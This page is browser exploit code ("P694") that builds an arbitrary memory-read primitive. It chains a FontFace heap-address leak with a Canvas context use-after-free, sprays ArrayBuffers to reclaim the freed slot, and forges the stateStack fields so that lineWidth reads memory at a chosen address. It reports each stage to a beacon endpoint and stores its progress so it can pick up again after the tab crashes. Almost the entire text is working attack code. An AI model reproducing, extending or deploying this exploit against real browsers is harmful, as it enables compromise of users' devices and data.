<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P694 — crash oracle (forge m_stateStack @ +112)</title>
<script>
'use strict';
/* ============================================================
 * P694 — FORGED m_stateStack ARBITRARY-READ ORACLE (V650-faithful)
 *
 * GOAL (step 4→5): chain FontFace address disclosure + Canvas UAF
 * overlap into an actual data-transfer channel: forge the State
 * vector inside the freed 768B context so that lineWidth reads
 * 8 bytes from an address we choose.
 *
 * WHY P693v1 FAILED: it kept a same-type context spray (sprayX2)
 * alongside the AB spray. That same-type alias reclaimed the freed
 * slot first, so innerCtx2.lineWidth read the *aliased live context*
 * (1337) — the forged AB m_buffer was never consulted. It also put
 * the pointer at qword shift∈{0..6} (bytes 0..48) and never set
 * m_size/m_capacity. The real field is m_stateStack.m_buffer at
 * context offset +112 (qword 14), m_capacity @+120, m_size @+124,
 * and lineWidth = m_stateStack.last().lineWidth = m_buffer + 48.
 *
 * DESIGN (V650 reference):
 *   1. FontFace reclaim → leak p58 (a live heap ptr in 0x10… range)
 *   2. Canvas UAF (bitmaprenderer outer + 2d inner, alpha getter)
 *   3. Spray ONLY ArrayBuffer(768) — cross-type reclaim of freed slot
 *   4. Forge every AB: qword[14] = target, u32@+120 = 1, u32@+124 = 1
 *   5. innerCtx2.lineWidth → reads float64 at (target + 48)
 *
 * CANARY: set target = p58 - 48, so lineWidth reads mem[p58], the
 * 8 bytes the FontFace continuation itself wrote (a WeakHashSet impl
 * pointer). If the oracle works we read back *exactly* that value,
 * which we ALSO independently know from Phase A → self-validating.
 * ============================================================ */

function b(tag,data){try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P694-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,900))+'&t='+Date.now(),true);
  x.send(null);}catch(e){}}
function ba(tag,data){try{new Image().src='/beacon.php?tag=P694-'+encodeURIComponent(tag)+
  '&data='+encodeURIComponent(String(data||'').slice(0,300))+'&t='+Date.now();}catch(e){}}
function hex(v){return '0x'+v.toString(16)}
function f64bits(v){return new BigUint64Array(new Float64Array([v]).buffer)[0]}

/* cookie/sessionStorage persistence across crash-respawn, like V650 */
function getStage(){try{var s=sessionStorage.getItem('p694s');if(s!==null)return parseInt(s)||0;}catch(e){}return 0;}
function setStage(v){try{sessionStorage.setItem('p694s',String(v));}catch(e){}
  try{document.cookie='p694s='+v+';path=/;max-age=86400';}catch(e){}}

var stage = getStage();

function run(){
  b('BOOT','stage='+stage);
  if(stage >= 3){ b('GIVEUP','all-stages-exhausted'); document.body.textContent='P694 GIVEUP'; return; }
  setStage(stage+1);   /* pre-increment: on crash, next load advances */

  try {
    if(stage === 0) return stageA_FontFace();
    if(stage === 1) return stageB_UAF();
    if(stage === 2) return stageC_Canary();
  } catch(e) { b('BOOT-ERR', (e.message||String(e)).slice(0,120)); }
}

/* ============ PHASE A: FontFace leak → p58, p68 ============ */
function stageA_FontFace(){
  b('A-GO');
  var styleEl=document.createElement('style');
  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(styleEl);
  var face=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;
  var ffAbs=[],ffFired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(ffFired)return undefined;ffFired=true;
      if(styleEl){styleEl.remove();styleEl.textContent='';styleEl=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<48;k++)ffAbs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em s0');}catch(e){}
      return undefined;
    },set:function(){}});
  document.fonts.load('1em f0, s0','AB');

  setTimeout(function(){
    var bestK=-1,bestNz=0;
    for(var k=0;k<ffAbs.length;k++){
      var u=new Uint8Array(ffAbs[k]),nz=0;
      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
      if(nz>bestNz){bestNz=nz;bestK=k;}
    }
    if(bestK<0||bestNz===0){ b('A-MISS','no-hit'); location.reload(); return; }
    var bv=new BigUint64Array(ffAbs[bestK]);
    var p58=bv[11], p68=bv[13];   /* qword 11 = offset 0x58, qword 13 = 0x68 */
    b('A-HIT','p58='+hex(p58)+'|p68='+hex(p68)+'|k='+bestK+'|nz='+bestNz);
    try{sessionStorage.setItem('p694_p58',p58.toString());}catch(e){}
    try{sessionStorage.setItem('p694_p68',p68.toString());}catch(e){}
    setStage(1);
    setTimeout(stageB_UAF, 60);
  }, 200);
}

/* ============ PHASE B: Canvas UAF, dangling innerCtx2 ============ */
function stageB_UAF(){
  b('B-GO');
  var p58=null,p68=null;
  try{p58=BigInt(sessionStorage.getItem('p694_p58'));}catch(e){}
  try{p68=BigInt(sessionStorage.getItem('p694_p68'));}catch(e){}
  if(p58===null){ b('B-NOLEAK','p58-persist-missing'); location.reload(); return; }

  var innerCtx2=null;
  var canvas2=document.createElement('canvas'); canvas2.width=1; canvas2.height=1;
  var o={};
  Object.defineProperty(o,'alpha',{get:function(){ innerCtx2=canvas2.getContext('2d'); return true; }});
  canvas2.getContext('bitmaprenderer', o);
  if(!innerCtx2){ b('B-FAIL','no-ctx'); return; }
  b('B-UAF','ok|p58='+hex(p58));

  /* CRITICAL: NO same-type context spray here. AB(768) is the ONLY reclaim. */
  var abs=[];
  for(var ai=0;ai<500;ai++) abs.push(new ArrayBuffer(768));
  b('B-SPRAY','500');

  var TARGET = p58 - BigInt(48);
  for(var fi=0;fi<abs.length;fi++){
    var bv=new BigUint64Array(abs[fi]);
    var u32=new Uint32Array(abs[fi]);
    bv[14]=TARGET;
    u32[30]=1;
    u32[31]=1;
  }
  b('B-FORGED','target='+hex(TARGET)+'|expect=mem['+hex(p58)+']');

  var lw=null,err=null;
  try{ lw=innerCtx2.lineWidth; }catch(e){ err=(e.message||String(e)); }
  if(err!==null){ b('B-READ-ERR', err.slice(0,160)); return; }

  b('B-READ','lw='+lw+'|bits='+hex(f64bits(lw)));
  setStage(2);
  setTimeout(function(){ stageC_Canary(lw, p58, p68, innerCtx2, abs); }, 40);
}

/* ============ PHASE C: validate canary + globalAlpha/miterLayout ============ */
function stageC_Canary(lw, p58, p68, innerCtx2, abs){
  b('C-GO','');
  var bits=f64bits(lw);
  b('C-RAW','lineWidth_bits='+hex(bits));

  var isNonZero = (bits!==BigInt(0));
  var looksHeap  = (bits >= BigInt('0x1000000000') && bits < BigInt('0x8000000000'));
  b('C-VERDICT','nonzero='+isNonZero+'|heapShaped='+looksHeap+'|bits='+hex(bits));

  try{ var ga=innerCtx2.globalAlpha; b('C-GA','globalAlpha='+ga+'|bits='+hex(f64bits(ga))); }catch(e){ b('C-GA-ERR',(e.message||'').slice(0,80)); }
  try{ var ml=innerCtx2.miterLimit; b('C-ML','miterLimit='+ml+'|bits='+hex(f64bits(ml))); }catch(e){ b('C-ML-ERR',(e.message||'').slice(0,80)); }

  var TARGET2 = p68 - BigInt(48);
  for(var fi=0;fi<abs.length;fi++){ new BigUint64Array(abs[fi])[14]=TARGET2; }
  try{
    var lw2=innerCtx2.lineWidth;
    b('C-2ND','target='+hex(TARGET2)+'|lw='+lw2+'|bits='+hex(f64bits(lw2)));
  }catch(e){ b('C-2ND-ERR',(e.message||'').slice(0,80)); }

  setStage(0);
  ba('DONE','oracle='+(isNonZero?'READ-WORKS':'ZERO')+'|heapShaped='+looksHeap+
     '|lw_bits='+hex(bits));
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
